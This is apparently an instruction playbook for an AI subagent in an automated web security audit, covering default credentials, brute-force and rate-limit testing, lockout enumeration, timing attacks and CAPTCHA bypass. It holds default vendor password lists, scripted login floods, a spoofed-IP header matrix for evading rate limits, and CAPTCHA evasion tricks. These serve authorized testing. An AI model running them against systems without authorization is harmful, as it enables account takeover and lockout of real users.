# Subagent 02: Default Credentials, Brute Force & Rate Limiting Defenses

## Role & Mission
Responsible for probing default administrative credentials, evaluating credential stuffing resistance, auditing rate-limiting thresholds, testing IP-spoofing header bypasses (`X-Forwarded-For`), verifying account lockout policies, testing timing differences, and auditing CAPTCHA integrity.

## Assigned Checklist Tasks (8 Checks)
- **Check 02:** Default credentials on admin panels, databases, and enterprise services
- **Check 03:** Common weak password dictionaries (`admin/admin`, `root/root`, `test/test`)
- **Check 09:** Credential stuffing vulnerability (absence of velocity limits or CAPTCHA)
- **Check 10:** Brute-force protection on login endpoints with automated header bypasses
- **Check 11:** Account lockout mechanism and threshold verification
- **Check 12:** Account lockout user enumeration vulnerability
- **Check 35:** Timing attack on password comparison function
- **Check 40:** CAPTCHA bypass on login and password reset forms

---

## Standardized Execution Playbook

### Step 1: Default Credentials Verification (Checks 02, 03)
Test common vendor credentials against administrative consoles discovered during content discovery:

| Service / Portal | Default Credentials |
|---|---|
| **Tomcat Manager** | `tomcat:s3cret`, `admin:admin`, `tomcat:tomcat` |
| **JBoss Admin** | `admin:admin`, `admin:jboss` |
| **WebLogic** | `weblogic:weblogic`, `system:password` |
| **RabbitMQ** | `guest:guest` |
| **MinIO** | `minioadmin:minioadmin` |
| **Jenkins** | `admin:admin`, `admin:password` |
| **Grafana** | `admin:admin` |
| **Generic CMS** | `admin:admin`, `admin:password`, `administrator:root` |

```bash
# Test default credentials via curl
curl -s -u "admin:admin" "https://<target>/admin" | grep -qiE "(dashboard|welcome|logout)" && echo "[!] Default credentials active: admin:admin"
```

### Step 2: Rate Limiting & Credential Stuffing Auditing (Checks 09, 10)
Test if the login endpoint blocks high-velocity automated login requests:

```bash
# Send 30 rapid failed login attempts
python3 -c "
import requests, time

url = 'https://<target>/api/auth/login'
headers = {'Content-Type': 'application/json'}

status_codes = []
for i in range(30):
    res = requests.post(url, json={'username': 'testuser', 'password': f'WrongPass_{i}'}, headers=headers)
    status_codes.append(res.status_code)
    time.sleep(0.1)

print('Status codes observed:', set(status_codes))
if 429 in status_codes:
    print('[+] Rate limiting is active (HTTP 429)')
else:
    print('[!] WARNING: No rate limiting observed after 30 attempts!')
"
```

### Step 3: Header-Based Rate-Limit Bypasses (Check 10 & rate_limit_bypass_headers.md)
If rate limiting triggers (HTTP 429 / CAPTCHA), test if injecting client IP headers circumvents the block:

```bash
# Spoofed Headers Matrix (TBHM & KongList.txt)
HEADERS_TO_TEST=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "CF-Connecting-IP: 1.1.1.1"
  "True-Client-IP: 1.1.1.1"
)

for h in "${HEADERS_TO_TEST[@]}"; do
  curl -s -X POST "https://<target>/api/auth/login" \
    -H "$h" \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser", "password":"password123"}' | grep -qi "Too many requests" || echo "[!] Rate limit bypassed via header: $h"
done
```

### Step 4: Account Lockout & User Enumeration (Checks 11, 12)
*Vulnerability Identification:* If an application locks an account after 5 failed attempts, observe whether a non-existent account produces the same lockout response:
- Existing user: `Account has been locked due to too many failed attempts.`
- Non-existent user: `Invalid username or password.`
This allows attackers to enumerate the entire user base and execute targeted Denial of Service (locking out arbitrary users).

### Step 5: Password Comparison Timing Attacks (Check 35)
Non-constant time string comparison (`if password == input_password`) terminates early on the first mismatched byte, creating measurable timing differences:

```bash
# Measure timing deltas across 100 requests comparing valid vs invalid prefixes
python3 -c "
import requests, time

url = 'https://<target>/api/auth/login'
# Send requests and record elapsed microseconds
times = []
for p in ['a', 'b', 'c', 'd', 'e', 'A', 'P']:
    start = time.perf_counter()
    requests.post(url, json={'username': 'admin', 'password': p * 50})
    times.append((p, time.perf_counter() - start))

for char, duration in times:
    print(f'Char: {char} -> Time: {duration:.5f}s')
"
```

### Step 6: CAPTCHA Bypass Auditing (Check 40)
Test common server-side CAPTCHA implementation flaws:
1. **Omit Parameter:** Remove `g-recaptcha-response` from request body entirely.
2. **Empty Value:** Submit `"g-recaptcha-response": ""`.
3. **Replay Token:** Submit a previously solved CAPTCHA token across multiple requests.
4. **Change Content-Type:** Change `application/json` to `application/x-www-form-urlencoded`.

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_02_bruteforce_report.md`
